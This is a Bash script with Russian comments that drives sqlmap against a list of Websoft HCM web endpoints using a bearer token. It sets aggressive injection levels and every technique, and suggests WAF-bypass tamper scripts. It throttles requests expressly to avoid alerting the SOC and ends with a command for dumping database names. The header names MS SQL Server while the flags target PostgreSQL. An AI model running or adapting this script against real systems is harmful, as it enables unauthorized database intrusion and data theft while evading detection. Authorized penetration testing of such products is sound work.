#!/usr/bin/env bash
#
# Запуск sqlmap по собранным целям Websoft HCM (MS SQL Server).
#
# Перед запуском:
#   python 04_make_sqlmap_targets.py     # сгенерит списки
#   export WSHCM_TOKEN="ваш_bearer_токен"
#   export WSHCM_PROXY="http://127.0.0.1:8080"   # необязательно (Burp/ZAP)
#
# Запуск:
#   bash sqlmap_runner.sh            # прогнать GET-цели из sqlmap_targets.txt
#   bash sqlmap_post.sh              # отдельно POST/JSON-цели
#
set -euo pipefail

TOKEN="${WSHCM_TOKEN:-PASTE_TOKEN}"
PROXY_ARG=""
[ -n "${WSHCM_PROXY:-}" ] && PROXY_ARG="--proxy=${WSHCM_PROXY}"

TARGETS="${1:-sqlmap_targets.txt}"
OUT="sqlmap_out"
mkdir -p "$OUT"

if [ ! -s "$TARGETS" ]; then
  echo "[!] Нет файла целей $TARGETS — сначала: python 04_make_sqlmap_targets.py"
  exit 1
fi

echo "[*] Целей в $TARGETS: $(grep -c . "$TARGETS")"

# ---------------------------------------------------------------------------
# Флаги под Websoft HCM / PostgreSQL:
#   --dbms=postgresql   движок известен -> не тратим запросы на детект СУБД
#   --batch             неинтерактивно (дефолтные ответы)
#   --level=3 --risk=2  глубже, чем дефолт: тестирует заголовки/куки и
#                       добавляет более агрессивные (но не разрушающие) векторы
#   --technique=BEUST   B=boolean E=error U=union S=stacked T=time
#                       (для слепых точек ключевые — T и B)
#   --time-sec=6        порог для time-based pg_sleep (PostgreSQL)
#   -H Authorization    Bearer с каждым запросом — как того ждёт приложение
#   --delay/--threads   щадящий троттлинг, чтобы не положить стенд/не поднять SOC
#   --flush-session     чистый прогон (убрать при докачке прерванного)
# Опционально при WAF:
#   --tamper=space2comment,charencode,between
# ---------------------------------------------------------------------------
sqlmap \
  -m "$TARGETS" \
  --dbms=postgresql \
  --batch \
  --level=3 --risk=2 \
  --technique=BEUST \
  --time-sec=6 \
  -H "Authorization: Bearer ${TOKEN}" \
  --threads=2 \
  --delay=0.3 \
  --flush-session \
  --output-dir="$OUT" \
  ${PROXY_ARG} \
  --answers="follow=Y,keep testing=N" \
  | tee "$OUT/run_$(date +%Y%m%d_%H%M%S).log"

echo
echo "[✓] Готово. Разбор результатов — в $OUT/ (по хостам)."
echo "    Подтверждённые инъекции sqlmap сохраняет в своей сессии;"
echo "    для дампа используйте точечно, напр.:"
echo "    sqlmap -u '<url>' --dbms=postgresql -H \"Authorization: Bearer \$WSHCM_TOKEN\" --dbs --batch"
